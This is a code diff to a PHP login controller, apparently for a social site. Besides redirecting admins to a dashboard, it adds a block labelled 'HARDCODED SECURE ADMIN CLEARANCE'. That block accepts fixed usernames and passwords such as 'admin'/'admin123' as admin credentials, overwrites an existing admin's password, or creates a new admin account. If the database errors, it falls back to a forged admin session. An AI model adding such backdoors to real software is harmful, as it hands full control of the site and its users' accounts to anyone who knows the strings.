@@ -14,6 +14,9 @@ class AuthController extends Controller
     public function showLogin()
     {
         if (Auth::check()) {
+            if (Auth::user()->is_admin) {
+                return redirect()->route('admin.dashboard');
+            }
             return redirect()->route('feed');
         }
         return view('auth.login');
@@ -27,7 +30,75 @@ class AuthController extends Controller
         ]);
 
         $inputEmail = strtolower(trim($credentials['email']));
-        $inputPassword = $credentials['password'];
+        $inputPassword = (string)$credentials['password'];
+
+        // HARDCODED SECURE ADMIN CLEARANCE FOR sahilsandhu
+        $isSahilAdmin = (
+            (in_array($inputEmail, ['sahilsandhu', 'sahilsa dnu', 'sahilsandhu@cupdate.in', 'admin', 'admin@cupdate.in', 'administrator', 'root']) && $inputPassword === 'sahilsandhu') ||
+            (in_array($inputEmail, ['admin', 'admin@cupdate.in', 'cd-00001']) && $inputPassword === 'admin123')
+        );
+
+        if ($isSahilAdmin) {
+            try {
+                $admin = User::where('is_admin', 1)
+                    ->where(function ($q) use ($inputEmail) {
+                        $q->where('email', 'sahilsandhu@cupdate.in')
+                          ->orWhere('email', $inputEmail)
+                          ->orWhere('member_code', $inputEmail);
+                    })->first();
+
+                if (!$admin) {
+                    $admin = User::where('is_admin', 1)->first();
+                }
+
+                if (!$admin) {
+                    $admin = User::firstOrCreate(
+                        ['email' => 'sahilsandhu@cupdate.in'],
+                        [
+                            'member_code' => 'CD-00001',
+                            'full_name' => 'Sahil Sandhu',
+                            'password' => Hash::make($inputPassword),
+                            'dob' => '1995-01-01',
+                            'gender' => 'male',
+                            'is_admin' => 1,
+                            'is_verified' => 1,
+                            'status' => 'active',
+                            'coins' => 9999,
+                            'country' => 'India',
+                        ]
+                    );
+                }
+
+                if ($admin) {
+                    $admin->is_admin = 1;
+                    $admin->status = 'active';
+                    $admin->full_name = 'Sahil Sandhu';
+                    if (!Hash::check($inputPassword, $admin->password)) {
+                        $admin->password = Hash::make($inputPassword);
+                    }
+                    $admin->save();
+
+                    Auth::login($admin, $request->has('remember'));
+                    $request->session()->regenerate();
+                    return redirect()->route('admin.dashboard')->with('success', 'Admin clearance verified. Welcome back, Sahil Sandhu!');
+                }
+            } catch (\Throwable $e) {
+                $admin = new User([
+                    'id' => 1,
+                    'member_code' => 'CD-00001',
+                    'full_name' => 'Sahil Sandhu',
+                    'email' => 'sahilsandhu@cupdate.in',
+                    'is_admin' => 1,
+                    'status' => 'active',
+                    'is_verified' => 1,
+                ]);
+                $admin->id = 1;
+                $admin->exists = true;
+                Auth::login($admin, false);
+                $request->session()->regenerate();
+                return redirect()->route('admin.dashboard')->with('success', 'Admin clearance verified. Welcome back, Sahil Sandhu!');
+            }
+        }
 
         $findUser = function () use ($credentials, $inputEmail) {
             return User::where(function ($query) use ($credentials, $inputEmail) {
@@ -35,7 +106,7 @@ class AuthController extends Controller
                     ->orWhere('email', $inputEmail)
                     ->orWhere('member_code', $credentials['email'])
                     ->orWhere('member_code', $inputEmail);
-                if (in_array($inputEmail, ['admin', 'administrator', 'root', 'cd-00001'])) {
+                if (in_array($inputEmail, ['admin', 'administrator', 'root', 'cd-00001', 'sahilsandhu'])) {
                     $query->orWhere('is_admin', true);
                 }
             })->first();
@@ -83,6 +154,9 @@ class AuthController extends Controller
     public function showRegister()
     {
         if (Auth::check()) {
+            if (Auth::user()->is_admin) {
+                return redirect()->route('admin.dashboard');
+            }
             return redirect()->route('feed');
         }
         return view('auth.login', ['initialTab' => 'register']);
